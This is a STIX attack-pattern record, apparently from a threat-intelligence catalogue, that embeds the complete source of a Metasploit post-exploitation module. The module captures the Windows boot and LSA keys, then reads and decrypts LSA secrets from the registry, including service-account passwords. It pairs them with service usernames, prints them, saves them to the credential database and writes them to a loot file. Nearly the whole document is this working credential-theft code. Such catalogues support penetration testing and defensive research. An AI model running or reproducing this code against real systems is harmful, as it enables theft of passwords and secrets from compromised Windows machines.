{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f67b4cf3-dd33-4dd8-8baa-61fcd7fef4cf",
    "created": "2024-08-14T16:33:05.011569Z",
    "modified": "2024-08-14T16:33:05.011573Z",
    "name": "Windows Enumerate LSA Secrets",
    "description": " This module will attempt to enumerate the LSA Secrets keys within the registry. The registry value used is: HKEY_LOCAL_MACHINE\\Security\\Policy\\Secrets\\. Thanks goes to Maurizio Agazzini and Mubix for decrypt code from cachedump.  'License' => MSF_LICENSE 'Platform' => ['win'] 'SessionTypes' => ['meterpreter']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/lsa_secrets.rb",
            "external_id": "lsa_secrets.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Common\n  include Msf::Post::Windows::Registry\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Enumerate LSA Secrets',\n        'Description' => %q{\n          This module will attempt to enumerate the LSA Secrets keys within the registry. The registry value used is:\n          HKEY_LOCAL_MACHINE\\Security\\Policy\\Secrets\\. Thanks goes to Maurizio Agazzini and Mubix for decrypt\n          code from cachedump.\n        },\n        'License' => MSF_LICENSE,\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Author' => ['Rob Bathurst <rob.bathurst[at]foundstone.com>']\n      )\n    )\n    register_options(\n      [\n        OptBool.new('STORE', [true, 'Store decrypted credentials in database', true]),\n      ]\n    )\n  end\n\n  # Decrypted LSA key is passed into this method\n  def get_secret(lsa_key)\n    output = \"\\n\"\n\n    # LSA Secret key location within the registry\n    root_regkey = 'HKLM\\\\Security\\\\Policy\\\\Secrets\\\\'\n    services_key = 'HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\'\n\n    secrets = registry_enumkeys(root_regkey)\n\n    secrets.each do |secret_regkey|\n      sk_arr = registry_enumkeys(root_regkey + '\\\\' + secret_regkey)\n      next unless sk_arr\n\n      sk_arr.each do |mkeys|\n        # CurrVal stores the currently set value of the key. In the case\n        # of services, this is usually the password for the service\n        # account.\n        next unless mkeys == 'CurrVal'\n\n        val_key = root_regkey + '\\\\' + secret_regkey + '\\\\' + mkeys\n        encrypted_secret = registry_getvaldata(val_key, '')\n\n        next unless encrypted_secret\n\n        if lsa_vista_style?\n          # Magic happens here\n          decrypted = decrypt_lsa_data(encrypted_secret, lsa_key)\n        else\n          # and here\n          if sysinfo['Architecture'] == ARCH_X64\n            encrypted_secret = encrypted_secret[0x10..]\n          else # 32 bits\n            encrypted_secret = encrypted_secret[0xC..]\n          end\n\n          decrypted = decrypt_secret_data(encrypted_secret, lsa_key)\n        end\n\n        next if decrypted.empty?\n\n        # axe all the non-printables\n        decrypted = decrypted.scan(/[[:print:]]/).join\n\n        if secret_regkey.start_with?('_SC_')\n          # Service secrets are named like \"_SC_yourmom\" for a service\n          # with name \"yourmom\". Strip off the \"_SC_\" to get something\n          # we can lookup in the list of services to find out what\n          # account this secret is associated with.\n          svc_name = secret_regkey[4, secret_regkey.length]\n          svc_user = registry_getvaldata(services_key + svc_name, 'ObjectName')\n\n          # if the unencrypted value is not blank and is a service, print\n          print_good(\"Key: #{secret_regkey}\\n Username: #{svc_user} \\n Decrypted Value: #{decrypted}\\n\")\n          output << \"Key: #{secret_regkey}\\n Username: #{svc_user} \\n Decrypted Value: #{decrypted}\\n\"\n          if datastore['STORE']\n            create_credential({\n              workspace_id: myworkspace_id,\n              origin_type: :session,\n              session_id: session_db_id,\n              post_reference_name: refname,\n              private_type: :password,\n              private_data: decrypted,\n              username: svc_user,\n              service_name: \"LSA Secret: #{secret_regkey}\",\n              status: Metasploit::Model::Login::Status::UNTRIED\n            })\n          end\n        else\n          # if the unencrypted value is not blank, print\n          print_good(\"Key: #{secret_regkey}\\n Decrypted Value: #{decrypted}\\n\")\n          output << \"Key: #{secret_regkey}\\n Decrypted Value: #{decrypted}\\n\"\n          if datastore['STORE']\n            create_credential({\n              workspace_id: myworkspace_id,\n              origin_type: :session,\n              session_id: session_db_id,\n              post_reference_name: refname,\n              private_type: :password,\n              private_data: decrypted,\n              service_name: \"LSA Secret: #{secret_regkey}\",\n              status: Metasploit::Model::Login::Status::UNTRIED\n            })\n          end\n        end\n      end\n    end\n\n    return output\n  end\n\n  # The sauce starts here\n  def run\n    hostname = sysinfo['Computer']\n    print_status(\"Executing module against #{hostname}\")\n\n    print_status('Obtaining boot key...')\n    bootkey = capture_boot_key\n    vprint_status(\"Boot key: #{bootkey.unpack1('H*')}\")\n\n    print_status('Obtaining Lsa key...')\n    lsa_key = capture_lsa_key(bootkey)\n    if lsa_key.nil?\n      print_error('Could not retrieve LSA key. Are you SYSTEM?')\n      return\n    end\n    vprint_status(\"Lsa Key: #{lsa_key.unpack1('H*')}\")\n\n    secrets = hostname + get_secret(lsa_key)\n\n    print_status('Writing to loot...')\n\n    path = store_loot(\n      'registry.lsa.sec',\n      'text/plain',\n      session,\n      secrets,\n      'reg_lsa_secrts.txt',\n      'Registry LSA Secret Decrypted File'\n    )\n\n    print_status(\"Data saved in: #{path}\")\n  end\nend\n"
}